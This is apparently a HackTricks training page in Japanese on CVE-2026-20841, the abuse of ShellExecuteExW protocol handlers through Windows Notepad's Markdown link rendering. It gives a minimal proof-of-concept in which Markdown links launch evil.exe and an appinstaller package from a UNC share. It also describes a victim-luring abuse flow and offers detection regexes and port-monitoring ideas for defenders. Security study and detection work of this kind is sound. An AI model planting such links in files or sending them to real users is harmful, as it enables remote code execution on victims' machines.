# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Markdown/HTML をレンダリングするモダンな Windows アプリケーションは、ユーザー提供のリンクをクリック可能な要素に変換して `ShellExecuteExW` に渡すことがよくあります。厳密なスキーム許可リストがないと、`file:` や `ms-appinstaller:` のような登録済みプロトコルハンドラがトリガーされ、現在のユーザーコンテキストでコード実行につながる可能性があります。

## ShellExecuteExW が Windows Notepad の Markdown モードで露出する箇所
- Notepad は `sub_1400ED5D0()` の固定文字列比較を介して **`.md` 拡張子に対してのみ** Markdown モードを選択します。
- サポートされる Markdown リンク:
- 標準: `[text](target)`
- Autolink: `<target>`（`[target](target)` としてレンダリングされる）ため、両方の構文がペイロードと検出に影響します。
- リンクのクリックは `sub_140170F60()` で処理され、ここで弱いフィルタリングが行われた後に `ShellExecuteExW` が呼ばれます。
- `ShellExecuteExW` は HTTP(S) のみならず、**設定された任意のプロトコルハンドラ** にディスパッチします。

### Payload considerations
- リンク内のすべての `\\` シーケンスは `ShellExecuteExW` に渡される前に **`\\` が `\` に正規化されます**。これは UNC/パスの作成や検出に影響します。
- `.md` ファイルはデフォルトで Notepad に関連付けられていません; 被害者はファイルを Notepad で開いてリンクをクリックする必要がありますが、一旦レンダリングされるとリンクはクリック可能になります。
- 危険なスキームの例:
- `file://` を使ってローカル/UNC payload を起動する。
- `ms-appinstaller://` は App Installer のフローをトリガーします。その他のローカル登録済みスキームも悪用可能な場合があります。

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### 悪用フロー
1. Notepad が Markdown として表示するような **`.md` ファイル** を作成する。
2. 危険な URI スキーム（`file:`, `ms-appinstaller:`, または任意のインストール済みハンドラ）を使ってリンクを埋め込む。
3. ファイルを（HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB 等で）配布し、ユーザーに Notepad で開かせるよう誘導する。
4. クリックすると、**正規化されたリンク** が `ShellExecuteExW` に渡され、対応するプロトコルハンドラが参照されたコンテンツをユーザーのコンテキストで実行する。

## 検出のアイデア
- ドキュメント配布で一般的に使われるポート/プロトコル上での `.md` ファイル転送を監視する：`20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown のリンク（standard と autolink）を解析し、**大文字小文字を区別せずに** `file:` または `ms-appinstaller:` を探す。
- ベンダー推奨の正規表現でリモートリソースアクセスを検出：
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- パッチの挙動は報告によれば、**ローカルファイルと HTTP(S) を許可リストに登録**します。`ShellExecuteExW` に到達するその他のものは疑わしいです。攻撃対象はシステムごとに異なるため、必要に応じて検出を他のインストール済みプロトコルハンドラーにも拡張してください。

## 参考資料
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
